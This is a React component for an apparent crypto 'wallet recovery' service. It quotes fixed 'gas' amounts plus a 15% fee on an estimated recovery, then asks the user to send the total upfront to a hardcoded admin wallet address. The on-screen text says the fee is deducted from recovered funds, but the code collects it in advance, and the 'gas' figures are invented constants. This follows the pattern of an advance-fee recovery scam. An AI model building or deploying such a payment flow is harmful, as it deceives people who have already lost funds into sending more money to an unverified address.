import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { Zap, CheckCircle, AlertCircle } from 'lucide-react';

export default function AutoGasPayment({ 
  walletAddress, 
  recoveryMethod, 
  estimatedAmount, 
  onPaymentComplete,
  provider 
}) {
  const [gasQuote, setGasQuote] = useState(null);
  const [loading, setLoading] = useState(true);
  const [charging, setCharging] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState(false);

  useEffect(() => {
    calculateGasRequirement();
  }, [walletAddress, recoveryMethod, estimatedAmount]);

  const calculateGasRequirement = async () => {
    try {
      const gasRequirements = {
        direct_claim: 0.005,
        staking_claim: 0.008,
        bridge_recovery: 0.012,
        contract_interaction: 0.01
      };

      const gasRequired = gasRequirements[recoveryMethod] || 0.01;
      const serviceFee = parseFloat(estimatedAmount) * 0.15;
      const totalRequired = gasRequired + serviceFee;

      // Check user balance
      const balance = await provider.getBalance(walletAddress);
      const userEth = parseFloat(ethers.formatEther(balance));

      setGasQuote({
        gasRequired,
        serviceFee,
        totalRequired,
        userBalance: userEth,
        canAfford: userEth >= totalRequired,
        adminWallet: '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15'
      });

    } catch (err) {
      setError('Failed to calculate gas requirements');
    } finally {
      setLoading(false);
    }
  };

  const executeAutoCharge = async () => {
    if (!gasQuote || !gasQuote.canAfford) return;

    setCharging(true);
    setError('');

    try {
      const signer = provider.getSigner();
      
      // Create the gas charge transaction
      const transaction = {
        to: gasQuote.adminWallet,
        value: ethers.parseEther(gasQuote.totalRequired.toString()),
        gasLimit: 21000
      };

      // Send transaction
      const tx = await signer.sendTransaction(transaction);
      
      // Wait for confirmation
      const receipt = await tx.wait();
      
      setSuccess(true);
      onPaymentComplete({
        verified: true,
        txHash: tx.hash,
        amount: gasQuote.totalRequired,
        blockNumber: receipt.blockNumber
      });

    } catch (err) {
      if (err.code === 'ACTION_REJECTED' || err.code === 4001) {
        setError('Transaction rejected by user');
      } else {
        setError('Payment failed: ' + err.message);
      }
    } finally {
      setCharging(false);
    }
  };

  if (loading) {
    return (
      <div className="bg-white rounded-xl p-6 shadow-lg text-center">
        <div className="w-12 h-12 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin mx-auto mb-4" />
        <p>Calculating gas requirements...</p>
      </div>
    );
  }

  if (success) {
    return (
      <div className="bg-white rounded-xl p-6 shadow-lg text-center">
        <CheckCircle className="w-16 h-16 text-green-500 mx-auto mb-4" />
        <h3 className="text-xl font-bold text-green-600 mb-2">Payment Successful!</h3>
        <p className="text-gray-600">Recovery will execute automatically</p>
      </div>
    );
  }

  return (
    <div className="bg-white rounded-xl p-6 shadow-lg max-w-lg mx-auto">
      <div className="text-center mb-6">
        <Zap className="w-12 h-12 text-blue-500 mx-auto mb-3" />
        <h3 className="text-xl font-bold text-gray-900 mb-2">Automatic Gas Payment</h3>
        <p className="text-gray-600">One-click payment for recovery execution</p>
      </div>

      {gasQuote && (
        <div className="space-y-4">
          {/* Payment Breakdown */}
          <div className="bg-gray-50 rounded-lg p-4">
            <h4 className="font-semibold text-gray-800 mb-3">Payment Breakdown</h4>
            <div className="space-y-2 text-sm">
              <div className="flex justify-between">
                <span className="text-gray-600">Gas Fee:</span>
                <span className="font-medium">{gasQuote.gasRequired.toFixed(4)} ETH</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600">Service Fee (15%):</span>
                <span className="font-medium">{gasQuote.serviceFee.toFixed(4)} ETH</span>
              </div>
              <div className="border-t pt-2 flex justify-between font-bold">
                <span>Total:</span>
                <span className="text-blue-600">{gasQuote.totalRequired.toFixed(4)} ETH</span>
              </div>
            </div>
          </div>

          {/* Balance Check */}
          <div className={`rounded-lg p-4 ${gasQuote.canAfford ? 'bg-green-50 border border-green-200' : 'bg-red-50 border border-red-200'}`}>
            <div className="flex items-center space-x-2">
              {gasQuote.canAfford ? (
                <CheckCircle className="w-5 h-5 text-green-500" />
              ) : (
                <AlertCircle className="w-5 h-5 text-red-500" />
              )}
              <div>
                <div className={`font-medium ${gasQuote.canAfford ? 'text-green-800' : 'text-red-800'}`}>
                  {gasQuote.canAfford ? 'Sufficient Balance' : 'Insufficient Balance'}
                </div>
                <div className={`text-sm ${gasQuote.canAfford ? 'text-green-600' : 'text-red-600'}`}>
                  Available: {gasQuote.userBalance.toFixed(4)} ETH
                </div>
              </div>
            </div>
          </div>

          {/* Recovery Details */}
          <div className="bg-blue-50 rounded-lg p-4">
            <h4 className="font-semibold text-blue-800 mb-2">Recovery Details</h4>
            <div className="text-sm text-blue-700 space-y-1">
              <div>Method: {recoveryMethod.replace('_', ' ')}</div>
              <div>Estimated Recovery: {estimatedAmount} ETH</div>
              <div>Net Amount: {(parseFloat(estimatedAmount) - gasQuote.serviceFee).toFixed(4)} ETH</div>
            </div>
          </div>

          {/* Error Display */}
          {error && (
            <div className="bg-red-50 border border-red-200 rounded-lg p-4">
              <div className="flex items-center space-x-2 text-red-600">
                <AlertCircle className="w-5 h-5" />
                <span className="font-medium">Error</span>
              </div>
              <p className="text-red-700 text-sm mt-1">{error}</p>
            </div>
          )}

          {/* Action Button */}
          <button
            onClick={executeAutoCharge}
            disabled={!gasQuote.canAfford || charging}
            className={`w-full py-3 px-4 rounded-lg font-bold transition-colors ${
              gasQuote.canAfford && !charging
                ? 'bg-blue-600 hover:bg-blue-700 text-white'
                : 'bg-gray-300 text-gray-500 cursor-not-allowed'
            }`}
          >
            {charging ? (
              <div className="flex items-center justify-center space-x-2">
                <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                <span>Processing Payment...</span>
              </div>
            ) : gasQuote.canAfford ? (
              `Pay ${gasQuote.totalRequired.toFixed(4)} ETH & Execute Recovery`
            ) : (
              'Insufficient Balance'
            )}
          </button>

          {/* Instructions */}
          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
            <h4 className="font-semibold text-yellow-800 mb-2">How it works:</h4>
            <ol className="text-sm text-yellow-700 space-y-1">
              <li>1. Click the payment button above</li>
              <li>2. Confirm the transaction in your wallet</li>
              <li>3. Recovery executes automatically after payment</li>
              <li>4. You receive recovered funds minus our 15% fee</li>
            </ol>
          </div>
        </div>
      )}
    </div>
  );
}